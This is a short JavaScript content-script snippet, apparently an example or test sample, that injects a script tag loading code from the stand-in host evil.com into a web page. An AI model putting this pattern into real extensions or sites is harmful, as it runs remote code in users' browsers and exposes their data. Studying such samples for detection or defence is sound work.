
// Content script - dynamic script injection
const script = document.createElement('script');
script.src = "https://evil.com/injected.js";
document.body.appendChild(script);
